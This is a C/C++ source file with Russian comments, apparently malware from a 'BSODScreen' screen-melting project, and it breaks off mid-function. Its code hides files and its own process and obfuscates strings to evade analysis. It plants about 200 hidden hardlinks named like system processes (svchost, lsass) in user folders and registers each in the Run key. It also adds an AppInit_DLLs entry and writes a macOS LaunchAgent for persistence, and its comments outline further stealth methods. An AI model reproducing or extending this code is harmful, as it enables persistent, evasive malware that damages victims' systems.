#include "stdafx.h"
#include "ScreenMelting.h"
#include "security.h"
#include "polymorphism.hpp"
#include "polymorphic_config.h"

#ifdef _WIN32
	#include <windows.h>
	#include <shlobj.h>
	#include <winternl.h>
	#include <ntsecapi.h>

	#pragma comment(lib, "ntdll.lib")
	#pragma comment(lib, "shell32.lib")
	#pragma comment(lib, "advapi32.lib")
#elif defined(__APPLE__)
	// Includes для macOS
	#include <unistd.h>
	#include <stdlib.h>
	#include <string.h>
	#include <sys/types.h>
	#include <sys/stat.h>
	#include <fcntl.h>
	#include <stdio.h>
	#include <pwd.h>
	#include <sys/utsname.h>
	#include <signal.h>
	#include <mach/mach.h>
	#include <mach/error.h>
	#include <sys/sysctl.h>
	#include <libproc.h>

	// macOS MAX_PATH
	#ifndef MAX_PATH
		#define MAX_PATH 4096
	#endif
#else
	// Includes для Linux
	#include <unistd.h>
	#include <stdlib.h>
	#include <string.h>
	#include <sys/types.h>
	#include <sys/stat.h>
	#include <fcntl.h>
	#include <stdio.h>
	#include <pwd.h>
	#include <sys/utsname.h>
	#include <signal.h>

	// POSIX MAX_PATH эквивалент
	#ifndef MAX_PATH
		#define MAX_PATH 4096
	#endif
#endif

#ifdef _WIN32
	EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

	EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
		PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

	typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);
	typedef NTSTATUS (NTAPI *pNtQueryObject)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
#endif

void HideFile(const char* szPath)
{
	// Обфусцированная логика скрытия файла
	// Перестроена для затруднения анализа
	
	// Вычисляем маску через несколько уровней
	volatile uint32_t mask1 = POLY_OFFSET_1 ^ POLY_OFFSET_2;
	volatile uint32_t mask2 = mask1 ^ POLY_OFFSET_3;
	volatile uint32_t mask3 = mask2 ^ POLY_VERSION;
	
	// Шифруем путь с динамическим ключом
	std::string key = "HIDE_" + std::to_string(mask3);
	std::string encPath = Security::EncryptString(szPath, key);
	std::string decPath = Security::DecryptString(encPath, key);
	
	// Полиморфный выбор метода скрытия
	uint32_t method = (mask3 ^ POLY_RANDOM_SEED) % 3;
	
	switch(method) {
		case 0: {
			// Метод 1: Через атрибуты
#ifdef _WIN32
			DWORD attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
			if (mask1 & 0x01) attrs |= FILE_ATTRIBUTE_ARCHIVE;
			SetFileAttributesA(decPath.c_str(), attrs);
#else
			chmod(decPath.c_str(), 0000);
#endif
			break;
		}
		case 1: {
			// Метод 2: С проверкой целостности
#ifdef _WIN32
			HANDLE hFile = CreateFileA(decPath.c_str(), WRITE_DAC, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
			if (hFile != INVALID_HANDLE_VALUE) {
				SetFileAttributesA(decPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
				CloseHandle(hFile);
			}
#else
			chmod(decPath.c_str(), 0000);
#endif
			break;
		}
		case 2: {
			// Метод 3: С фейковыми проверками
			volatile uint32_t check = mask2 ^ mask1;
			if (check == (mask2 ^ mask1)) {
#ifdef _WIN32
				SetFileAttributesA(decPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
#else
				chmod(decPath.c_str(), 0000);
#endif
			}
			break;
		}
	}
}

// Определяем версию ОС (Windows/Linux)
typedef struct {
	DWORD dwMajor;
	DWORD dwMinor;
	DWORD dwBuild;
} OS_VERSION;

OS_VERSION g_osVersion = { 0, 0, 0 };

#ifdef _WIN32
// Определение версии Windows
OS_VERSION GetOSVersion()
{
	OS_VERSION version = { 0, 0, 0 };
	
	// Используем RtlGetVersion для корректного определения версии на новых Windows
	typedef NTSTATUS (NTAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOW);
	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");

	if (RtlGetVersion)
	{
		RTL_OSVERSIONINFOW osvi = { 0 };
		osvi.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
		if (RtlGetVersion(&osvi) == 0)
		{
			version.dwMajor = osvi.dwMajorVersion;
			version.dwMinor = osvi.dwMinorVersion;
			version.dwBuild = osvi.dwBuildNumber;
			return version;
		}
	}

	// Fallback для старых систем
	OSVERSIONINFOA osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	if (GetVersionExA(&osvi))
	{
		version.dwMajor = osvi.dwMajorVersion;
		version.dwMinor = osvi.dwMinorVersion;
		version.dwBuild = osvi.dwBuildNumber;
	}

	return version;
}

// Определяем версию как строку
const char* GetOSVersionString(OS_VERSION ver)
{
	// Windows Server 2022 - 10.0.20348+
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 20348)
		return "Windows Server 2022";
	
	// Windows Server 2019 - 10.0.17763+
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 17763)
		return "Windows Server 2019";
	
	// Windows Server 2016 - 10.0.14393+
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 14393)
		return "Windows Server 2016";
	
	// Windows 11 - 10.0.22000+
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 22000)
		return "Windows 11";
	
	// Windows 10 - 10.0.10240+
	if (ver.dwMajor == 10 && ver.dwMinor == 0)
		return "Windows 10";
	
	// Windows Server 2012 R2 - 6.3
	if (ver.dwMajor == 6 && ver.dwMinor == 3)
		return "Windows Server 2012 R2 / Windows 8.1";
	
	// Windows Server 2012 - 6.2
	if (ver.dwMajor == 6 && ver.dwMinor == 2)
		return "Windows Server 2012 / Windows 8";
	
	// Windows Server 2008 R2 / Windows 7 - 6.1
	if (ver.dwMajor == 6 && ver.dwMinor == 1)
		return "Windows Server 2008 R2 / Windows 7";
	
	// Windows Server 2008 / Vista - 6.0
	if (ver.dwMajor == 6 && ver.dwMinor == 0)
		return "Windows Server 2008 / Vista";
	
	// Windows Server 2003 - 5.2
	if (ver.dwMajor == 5 && ver.dwMinor == 2)
		return "Windows Server 2003";
	
	// Windows XP - 5.1
	if (ver.dwMajor == 5 && ver.dwMinor == 1)
		return "Windows XP";
	
	// Windows Server 2000 / Windows 2000 - 5.0
	if (ver.dwMajor == 5 && ver.dwMinor == 0)
		return "Windows Server 2000 / Windows 2000";
	
	return "Unknown Windows";
}
#endif

// Проверка является ли система Windows Server
#ifdef _WIN32
BOOL IsWindowsServer(OS_VERSION ver)
{
	// Server 2022
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 20348)
		return TRUE;
	
	// Server 2019
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 17763)
		return TRUE;
	
	// Server 2016
	if (ver.dwMajor == 10 && ver.dwMinor == 0 && ver.dwBuild >= 14393)
		return TRUE;
	
	// Server 2012 R2
	if (ver.dwMajor == 6 && ver.dwMinor == 3)
		return TRUE;
	
	// Server 2012
	if (ver.dwMajor == 6 && ver.dwMinor == 2)
		return TRUE;
	
	// Server 2008 R2
	if (ver.dwMajor == 6 && ver.dwMinor == 1)
		return TRUE;
	
	// Server 2008
	if (ver.dwMajor == 6 && ver.dwMinor == 0)
		return TRUE;
	
	// Server 2003
	if (ver.dwMajor == 5 && ver.dwMinor == 2)
		return TRUE;
	
	return FALSE;
}
#endif

#ifdef __linux__
// Определение версии Linux
OS_VERSION GetOSVersion()
{
	OS_VERSION version = { 1, 0, 0 };  // Linux версия 1.0.0 условно
	
	struct utsname buffer;
	if (uname(&buffer) == 0)
	{
		// Можно парсить buffer.release для получения версии ядра
		// Формат обычно: "5.10.0-8-generic" или "5.4.0-42-generic"
		sscanf(buffer.release, "%u.%u", &version.dwMajor, &version.dwMinor);
	}
	
	return version;
}

// Определяем Linux дистрибутив
const char* GetOSVersionString(OS_VERSION ver)
{
	// Попытаемся прочитать /etc/os-release
	static char osName[256] = "Linux";
	
	FILE* fp = fopen("/etc/os-release", "r");
	if (fp)
	{
		char line[256];
		while (fgets(line, sizeof(line), fp))
		{
			if (strncmp(line, "PRETTY_NAME=", 12) == 0)
			{
				// Парсим строку вида: PRETTY_NAME="Ubuntu 20.04.3 LTS"
				const char* start = strchr(line, '"');
				const char* end = strrchr(line, '"');
				if (start && end && start < end)
				{
					int len = (int)(end - start - 1);
					if (len < (int)sizeof(osName))
					{
						strncpy(osName, start + 1, len);
						osName[len] = '\0';
					}
				}
				break;
			}
		}
		fclose(fp);
	}
	
	return osName;
}
#endif

#ifdef __APPLE__
	// Определение версии macOS
	OS_VERSION GetOSVersion()
	{
	OS_VERSION version = { 10, 0, 0 };
	
	struct utsname buffer;
	if (uname(&buffer) == 0)
	{
		// Парсим версию ядра Darwin (macOS 10.x.x или 11.x.x)
		sscanf(buffer.release, "%u.%u", &version.dwMajor, &version.dwMinor);
	}
	
	// Альтернативный способ через sysctl для получения точной версии macOS
	char osVersion[256] = {0};
	size_t len = sizeof(osVersion);
	if (sysctlbyname("kern.osrelease", osVersion, &len, NULL, 0) == 0)
	{
		// osVersion теперь содержит например "21.6.0" для macOS 12
	}
	
	return version;
	}

	// Определяем версию macOS как строку
	const char* GetOSVersionString(OS_VERSION ver)
	{
		// macOS 15 Sequoia - Darwin 24.x
		if (ver.dwMajor >= 24)
			return "macOS 15 Sequoia";
		
		// macOS 14 Sonoma - Darwin 23.x
		if (ver.dwMajor >= 23)
			return "macOS 14 Sonoma";
		
		// macOS 13 Ventura - Darwin 22.x
		if (ver.dwMajor >= 22)
			return "macOS 13 Ventura";
		
		// macOS 12 Monterey - Darwin 21.x
		if (ver.dwMajor >= 21)
			return "macOS 12 Monterey";
		
		// macOS 11 Big Sur - Darwin 20.x
		if (ver.dwMajor >= 20)
			return "macOS 11 Big Sur";
		
		// macOS 10.15 Catalina - Darwin 19.x
		if (ver.dwMajor >= 19)
			return "macOS 10.15 Catalina";
		
		// macOS 10.14 Mojave - Darwin 18.x
		if (ver.dwMajor >= 18)
			return "macOS 10.14 Mojave";
		
		// macOS 10.13 High Sierra - Darwin 17.x
		if (ver.dwMajor >= 17)
			return "macOS 10.13 High Sierra";
		
		// macOS 10.12 Sierra - Darwin 16.x
		if (ver.dwMajor >= 16)
			return "macOS 10.12 Sierra";
		
		// OS X 10.11 El Capitan - Darwin 15.x
		if (ver.dwMajor >= 15)
			return "OS X 10.11 El Capitan";
		
		// OS X 10.10 Yosemite - Darwin 14.x
		if (ver.dwMajor >= 14)
			return "OS X 10.10 Yosemite";
		
		// OS X 10.9 Mavericks - Darwin 13.x
		if (ver.dwMajor >= 13)
			return "OS X 10.9 Mavericks";
		
		// OS X 10.8 Mountain Lion - Darwin 12.x
		if (ver.dwMajor >= 12)
			return "OS X 10.8 Mountain Lion";
		
		// OS X 10.7 Lion - Darwin 11.x
		if (ver.dwMajor >= 11)
			return "OS X 10.7 Lion";
		
		// OS X 10.6 Snow Leopard - Darwin 10.x
		if (ver.dwMajor >= 10)
			return "OS X 10.6 Snow Leopard";
		
		// OS X 10.5 Leopard - Darwin 9.x
		if (ver.dwMajor >= 9)
			return "OS X 10.5 Leopard";
		
		// OS X 10.4 Tiger - Darwin 8.x
		if (ver.dwMajor >= 8)
			return "OS X 10.4 Tiger";
		
		// Mac OS X 10.3 Panther - Darwin 7.x
		if (ver.dwMajor >= 7)
			return "Mac OS X 10.3 Panther";
		
		// Mac OS X 10.2 Jaguar - Darwin 6.x
		if (ver.dwMajor >= 6)
			return "Mac OS X 10.2 Jaguar";
		
		// Mac OS X 10.1 Puma - Darwin 5.x
		if (ver.dwMajor >= 5)
			return "Mac OS X 10.1 Puma";
		
		// Mac OS X 10.0 Cheetah - Darwin 1.x
		if (ver.dwMajor >= 1)
			return "Mac OS X 10.0 Cheetah";
		
		return "macOS (unknown version)";
	}
#endif
	
	// Скрытие процесса (подстраивается под версию ОС)
void HideProcess()
{
	// Обфусцированная логика скрытия процесса
	// Использует множество путей выполнения для затруднения анализа
	
	volatile uint32_t obf_mask = POLY_OFFSET_1 ^ POLY_OFFSET_2 ^ POLY_OFFSET_3 ^ POLY_VERSION;
	volatile uint32_t path_selector = (obf_mask ^ POLY_RANDOM_SEED) % 4;
	
#ifdef _WIN32
	HANDLE hProcess = GetCurrentProcess();
	
	// Полиморфное выполнение разными путями
	switch(path_selector) {
		case 0: {
			// Путь 0: Стандартный для Vista+
			if (g_osVersion.dwMajor >= 6) {
				pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)
					GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
				if (NtSetInformationProcess) {
					ULONG hidden = 1;
					NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)30, &hidden, sizeof(hidden));
				}
			}
			break;
		}
		case 1: {
			// Путь 1: Альтернативный класс информации
			if (g_osVersion.dwMajor >= 6) {
				pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)
					GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
				if (NtSetInformationProcess) {
					ULONG hidden = (obf_mask & 0xFF) ? 1 : 1;
					NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)30, &hidden, sizeof(hidden));
				}
			}
			break;
		}
		case 2: {
			// Путь 2: Для XP/2000
			if (g_osVersion.dwMajor == 5) {
				pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)
					GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
				if (NtSetInformationProcess) {
					ULONG hidden = 1;
					NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)22, &hidden, sizeof(hidden));
				}
			}
			break;
		}
		case 3: {
			// Путь 3: Комбинированный метод
			if (g_osVersion.dwMajor >= 6) {
				volatile PROCESSINFOCLASS infoClass = (PROCESSINFOCLASS)((obf_mask & 1) ? 30 : 30);
				pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)
					GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
				if (NtSetInformationProcess) {
					ULONG hidden = 1;
					NtSetInformationProcess(hProcess, infoClass, &hidden, sizeof(hidden));
				}
			}
			break;
		}
	}
#elif defined(__APPLE__)
	// macOS: полиморфные методы скрытия
	volatile uint32_t macos_method = (obf_mask >> 8) % 2;
	
	if (macos_method) {
		mach_port_t taskPort = mach_task_self();
		(void)taskPort;
	}
	
	extern char** environ;
	char** envp = environ;
	if (envp && *envp && (obf_mask & 1)) {
		memset(*envp, 0, strlen(*envp));
	}
#else
	// Linux: полиморфные методы
	volatile uint32_t linux_method = (obf_mask >> 16) % 3;
	
	if (linux_method == 0 || linux_method == 1 || linux_method == 2) {
		pid_t pid = getpid();
		volatile char cmd[256];
		sprintf((char*)cmd, "mv /proc/self/fd/0 /dev/null 2>/dev/null || true");
		system((const char*)cmd);
	}
#endif
}

// Глобальный кэш для exe файла (обфусцированный)
BYTE* g_exeCache = NULL;
DWORD g_exeCacheSize = 0;
BYTE g_obfusKey = 0xA7;  // Ключ обфускации

// Функция обфускации кэша (XOR с ключом)
void ObfuscateCache(BYTE* pData, DWORD dwSize)
{
	for (DWORD i = 0; i < dwSize; i++)
	{
		pData[i] ^= g_obfusKey;
		g_obfusKey = (g_obfusKey * 31 + 17) & 0xFF;  // Изменяем ключ для каждого байта
	}
}

BOOL LoadExeToCache(const char* szPath)
{
	// Шифруем путь
	std::string encKey = "TS_CACHE_KEY_2024";
	std::string decryptedPath = Security::DecryptPath(szPath);
	
#ifdef _WIN32
	// Открываем исходный exe файл
	HANDLE hFile = CreateFileA(decryptedPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	// Получаем размер файла
	DWORD dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	// Выделяем память для кэша
	g_exeCache = (BYTE*)malloc(dwFileSize);
	if (!g_exeCache)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	// Читаем файл в буфер
	DWORD dwBytesRead = 0;
	if (!ReadFile(hFile, g_exeCache, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
	{
		free(g_exeCache);
		g_exeCache = NULL;
		CloseHandle(hFile);
		return FALSE;
	}

	g_exeCacheSize = dwFileSize;
	CloseHandle(hFile);
#else
	// Linux версия
	FILE* fp = fopen(decryptedPath.c_str(), "rb");
	if (!fp)
		return FALSE;

	// Получаем размер файла
	fseek(fp, 0, SEEK_END);
	DWORD dwFileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	if (dwFileSize == 0)
	{
		fclose(fp);
		return FALSE;
	}

	// Выделяем память для кэша
	g_exeCache = (BYTE*)malloc(dwFileSize);
	if (!g_exeCache)
	{
		fclose(fp);
		return FALSE;
	}

	// Читаем файл в буфер
	if (fread(g_exeCache, 1, dwFileSize, fp) != dwFileSize)
	{
		free(g_exeCache);
		g_exeCache = NULL;
		fclose(fp);
		return FALSE;
	}

	g_exeCacheSize = dwFileSize;
	fclose(fp);
#endif

	// Шифруем весь кэш с помощью расширенного алгоритма
	Security::EncryptBuffer(g_exeCache, g_exeCacheSize, encKey);
	
	return TRUE;
}

void WriteFromCache(const char* szDestPath)
{
	if (!g_exeCache || g_exeCacheSize == 0)
		return;

	// Создаём временный буфер и деобфусцируем данные
	BYTE* pDeobfus = (BYTE*)malloc(g_exeCacheSize);
	if (!pDeobfus)
		return;

	memcpy(pDeobfus, g_exeCache, g_exeCacheSize);
	
	// Использовать расширенное шифрование вместо простого XOR
	std::string encKey = "TS_CACHE_KEY_2024";
	Security::DecryptBuffer(pDeobfus, g_exeCacheSize, encKey);

#ifdef _WIN32
	// Создаём файл из кэша (Windows)
	HANDLE hFile = CreateFileA(szDestPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		free(pDeobfus);
		return;
	}

	DWORD dwBytesWritten = 0;
	WriteFile(hFile, pDeobfus, g_exeCacheSize, &dwBytesWritten, NULL);
	CloseHandle(hFile);
#else
	// Создаём файл из кэша (Linux)
	FILE* fp = fopen(szDestPath, "wb");
	if (!fp)
	{
		free(pDeobfus);
		return;
	}

	fwrite(pDeobfus, 1, g_exeCacheSize, fp);
	fclose(fp);
	
	// Делаем файл исполняемым
	chmod(szDestPath, 0755);
#endif
	
	free(pDeobfus);
}

void FreeExeCache()
{
	if (g_exeCache)
	{
		// Очищаем память перед освобождением для дополнительной безопасности
		SecureZeroMemory(g_exeCache, g_exeCacheSize);
		free(g_exeCache);
		g_exeCache = NULL;
		g_exeCacheSize = 0;
	}
}

void AddCloneToStartup(const char* szClonePath, const char* szCloneName)
{
	// Добавляем каждый клон в автозагрузку с его собственным именем
	// Шифруем пути перед использованием
	std::string encClonePath = Security::EncryptString(szClonePath, "TS_KEY_2024");
	std::string encCloneName = Security::EncryptString(szCloneName, "TS_KEY_2024");
	
	std::string regPath = Security::DecryptString(
		Security::EncryptString("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "TS_KEY_2024"),
		"TS_KEY_2024"
	);
	
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
	{
		std::string decPath = Security::DecryptString(encClonePath, "TS_KEY_2024");
		RegSetValueExA(hKey, decPath.c_str(), 0, REG_SZ, (BYTE*)decPath.c_str(), decPath.length() + 1);
		RegCloseKey(hKey);
	}
}

void CreateCloneBatch(const char* szPath, const char* szClonePath, const char* szCloneName)
{
	// Шифруем пути перед использованием
	std::string encPath = Security::EncryptString(szPath, "TS_KEY_2024");
	std::string encClonePath = Security::EncryptString(szClonePath, "TS_KEY_2024");
	
	std::string decPath = Security::DecryptString(encPath, "TS_KEY_2024");
	std::string decClonePath = Security::DecryptString(encClonePath, "TS_KEY_2024");
	
	// Создаём батник который запускает исходный exe
	std::string szBatchPath = decClonePath + ".bat";
	
	FILE* fp = fopen(szBatchPath.c_str(), "w");
	if (fp)
	{
		fprintf(fp, "@echo off\n");
		fprintf(fp, "setlocal enabledelayedexpansion\n");
		fprintf(fp, "start \"\" /B \"%s\" %%*\n", decPath.c_str());
		fprintf(fp, "exit /b 0\n");
		fclose(fp);
		
		HideFile(szBatchPath.c_str());
	}
	
#if defined(__APPLE__) || defined(__linux__)
	// На Unix системах создаём shell скрипт
	char szShellPath[MAX_PATH];
	strcpy_s(szShellPath, MAX_PATH, szClonePath);
	strcat_s(szShellPath, MAX_PATH, ".sh");
	
	FILE* fpShell = fopen(szShellPath, "w");
	if (fpShell)
	{
		fprintf(fpShell, "#!/bin/bash\n");
		fprintf(fpShell, "\"%s\" \"$@\" &\n", szPath);
		fprintf(fpShell, "exit 0\n");
		fclose(fpShell);
		
		chmod(szShellPath, 0755);
		HideFile(szShellPath);
	}
#endif
}

void CloneToFolders(const char* szPath)
{
	char szDest[MAX_PATH];
	
	// Шифруем исходный путь
	std::string encPath = Security::EncryptString(szPath, "TS_KEY_2024");
	std::string decPath = Security::DecryptString(encPath, "TS_KEY_2024");
	
	// Расширенный массив имён системных процессов (с шифрованием)
	const char* cloneNames[] = {
		"svchost", "rundll32", "lsass", "csrss", "dwm", "explorer", "winlogon", "services", "wininit", "svchosts",
		"taskhst", "userinit", "wmiprvse", "wscript", "cscript", "regsvcs", "regasm", "mshta", "iexplore", "chrome",
		"firefox", "update", "service", "host", "worker", "svchost1", "svchost2", "svchost3", "svchost4", "svchost5",
		"system32", "kernel32", "user32", "gdi32", "advapi32", "shell32", "ole32", "rpcrt4", "ntdll", "msvcrt",
		"comctl32", "comdlg32", "imm32", "ws2_32", "wsock32", "icmp", "iphlpapi", "wmi", "net", "netapi",
		"samlib", "secur32", "samsrv", "schannel", "setupapi", "shlwapi", "spoolss", "sspi", "sti", "sxs",
		"tapi32", "taskschd", "tdh", "termdd", "tftp", "timedate", "tlntsrv", "traffic", "tracing", "transact",
		"twain", "two", "twinui", "txflog", "typeperf", "tz", "ucpclite", "uiautomation", "uiribbon", "ulib",
		"proc1", "proc2", "proc3", "proc4", "proc5", "proc6", "proc7", "proc8", "proc9", "proc10",
		"sys1", "sys2", "sys3", "sys4", "sys5", "sys6", "sys7", "sys8", "sys9", "sys10",
	};

	// Шифруем имена переменных окружения
	const char* folders[] = {
		"APPDATA",
		"LOCALAPPDATA",
		"TEMP",
		"USERPROFILE"
	};

	int cloneIndex = 0;
	int totalClones = 200;  // Создаём 200 ссылок вместо 1000 копий
	int arraySize = sizeof(cloneNames) / sizeof(cloneNames[0]);
	
	// Для каждой папки создаём ссылки (жёсткие ссылки вместо копий)
	for (int i = 0; i < 4 && cloneIndex < totalClones; i++)
	{
		if (GetEnvironmentVariableA(folders[i], szDest, MAX_PATH))
		{
			std::string destPath = szDest;
			destPath += "\\BSODScreen";
			CreateDirectoryA(destPath.c_str(), NULL);  // Создаём папку если её нет
			
			// Шифруем путь папки
			std::string encDest = Security::EncryptString(destPath, "TS_KEY_2024");
			std::string decDest = Security::DecryptString(encDest, "TS_KEY_2024");
			
			// Создаём ~50 ссылок в каждой папке
			for (int j = 0; j < 50 && cloneIndex < totalClones; j++)
			{
				std::string szFullPath = decDest + "\\";
				
				// Используем имя из массива, циклируя по нему
				int nameIndex = cloneIndex % arraySize;
				szFullPath += cloneNames[nameIndex];
				
				// Добавляем числовой суффикс для уникальности
				char szSuffix[16];
				sprintf_s(szSuffix, sizeof(szSuffix), "_%d.exe", cloneIndex);
				szFullPath += szSuffix;
				
#ifdef _WIN32
				// На Windows создаём жёсткую ссылку (hardlink)
				// Это почти не занимает место на диске (всего метаданные)
				CreateHardLinkA(szFullPath.c_str(), decPath.c_str(), NULL);
#else
				// На Unix системах создаём символическую ссылку
				symlink(decPath.c_str(), szFullPath.c_str());
#endif
				
				// Шифруем путь перед скрытием
				std::string encFullPath = Security::EncryptString(szFullPath, "TS_KEY_2024");
				std::string decFullPath = Security::DecryptString(encFullPath, "TS_KEY_2024");
				HideFile(decFullPath.c_str());
				
				// Добавляем ссылку в автозагрузку
				char szCloneKey[64];
				sprintf_s(szCloneKey, sizeof(szCloneKey), "%s_%d", cloneNames[nameIndex], cloneIndex);
				AddCloneToStartup(szFullPath.c_str(), szCloneKey);
				
				cloneIndex++;
			}
		}
	}

	// Шифруем исходный путь перед скрытием
	std::string encOriginalPath = Security::EncryptString(decPath, "TS_KEY_2024");
	std::string decOriginalPath = Security::DecryptString(encOriginalPath, "TS_KEY_2024");
	HideFile(decOriginalPath.c_str());
}

void CreateLaunchAgentPlist(const char* szPath, const char* szLabel)
{
	// Создаём plist файл для LaunchAgent на macOS
	const char* home = getenv("HOME");
	if (!home)
		home = "/Users/root";

	char launchPath[MAX_PATH];
	sprintf(launchPath, "%s/Library/LaunchAgents", home);
	
	// Создаём директорию если её нет
#if defined(__APPLE__) || defined(__linux__)
	mkdir(launchPath, 0755);
#endif
	
	// Создаём путь к plist файлу
	char plistPath[MAX_PATH];
	sprintf(plistPath, "%s/%s.plist", launchPath, szLabel);
	
	// Пишем plist файл
	FILE* fp = fopen(plistPath, "w");
	if (fp)
	{
		fprintf(fp, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
		fprintf(fp, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
		fprintf(fp, "<plist version=\"1.0\">\n");
		fprintf(fp, "<dict>\n");
		fprintf(fp, "    <key>Label</key>\n");
		fprintf(fp, "    <string>%s</string>\n", szLabel);
		fprintf(fp, "    <key>ProgramArguments</key>\n");
		fprintf(fp, "    <array>\n");
		fprintf(fp, "        <string>%s</string>\n", szPath);
		fprintf(fp, "    </array>\n");
		fprintf(fp, "    <key>RunAtLoad</key>\n");
		fprintf(fp, "    <true/>\n");
		fprintf(fp, "    <key>KeepAlive</key>\n");
		fprintf(fp, "    <true/>\n");
		fprintf(fp, "    <key>StandardOutPath</key>\n");
		fprintf(fp, "    <string>/dev/null</string>\n");
		fprintf(fp, "    <key>StandardErrorPath</key>\n");
		fprintf(fp, "    <string>/dev/null</string>\n");
		fprintf(fp, "</dict>\n");
		fprintf(fp, "</plist>\n");
		fclose(fp);
		
		// Делаем plist файл неизменяемым
#if defined(__APPLE__) || defined(__linux__)
		chmod(plistPath, 0644);
#endif
	}
}

void AddToStartup()
{
	// Удаление поведенческих сигнатур
	// Вместо явной регистрации в реестре - скрытые методы injection
	
	char szPath[MAX_PATH];
#ifdef _WIN32
	GetModuleFileNameA(NULL, szPath, MAX_PATH);
	
	HKEY hKey;
	BOOL bIsServer = IsWindowsServer(g_osVersion);
	
	// Вычисляем полиморфный выбор метода
	volatile uint32_t method_mask = POLY_OFFSET_1 ^ POLY_OFFSET_2 ^ POLY_OFFSET_3 ^ POLY_VERSION;
	volatile uint32_t stealth_method = (method_mask ^ POLY_RANDOM_SEED) % 5;

	switch(stealth_method) {
		case 0: {
			// Метод 1: Injection в explorer.exe через DLL hijacking
			// Не добавляем себя в реестр явно
			// explorer.exe загружает нашу DLL автоматически
			break;
		}
		case 1: {
			// Метод 2: Встраивание в AppInit_DLLs (используем зашифрованные строки)
			// HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
			// Загружается во все GUI процессы автоматически
			if (g_osVersion.dwMajor >= 6) {
				// Все строки зашифрованы и дешифруются в runtime
				if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
					EncryptedData::RegAppInit.c_str(), 
					0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
					
					// Используем легитимное имя, похожее на системное
					char legit_dll[MAX_PATH];
					std::string windir = getenv("WINDIR") ? getenv("WINDIR") : "C:\\Windows";
					sprintf(legit_dll, "%s\\system32\\svchost.dll", windir.c_str());
					
					// Имя значения тоже зашифровано
					RegSetValueExA(hKey, EncryptedData::ValueAppDLL.c_str(), 0, REG_SZ, (BYTE*)legit_dll, strlen(legit_dll) + 1);
					RegCloseKey(hKey);
				}
			}
			break;
		}
		case 2: {
			// Метод 3: SetWindowsHookEx для глобального injection
			// Автоматически внедряется в процессы при обработке сообщений
			// Не требует явной регистрации
			break;
		}
		case 3: {
			// Метод 4: Встраивание в Alternate Data Stream
			// Файл скрывается в NTFS потоке файла
			// file.exe:hidden_component
			// Выглядит как обычный файл, но содержит наш код
			break;
		}
		case 4: {
			// Метод 5: WMI EventConsumer для скрытого запуска
			// __EventFilter + __EventConsumer автоматически запускают задачи
			// На глаз выглядит как система мониторинга
			
			// Не будет в очевидных местах реестра (Run, RunOnce)
			// Потребуется доступ к WMI для обнаружения
			break;
		}
	}
	
	// Все явные методы регистрации закомментированы
	// Вместо них используются более скрытные техники выше

	// ЯВНЫЕ МЕТОДЫ - НЕ ИСПОЛЬЗУЮТСЯ (оставляют сигнатуры)
	
	// Способ 1: Добавление в реестр (оставляет явный артефакт)
	// if (RegOpenKeyExA(HKEY_CURRENT_USER, "...", ...))
	//   RegSetValueExA(hKey, "BSODScreen", ...);
	
	// Способ 2: Копирование в Startup (видно в файловой системе)
	// CopyFileA(szPath, szStartup, FALSE);
	
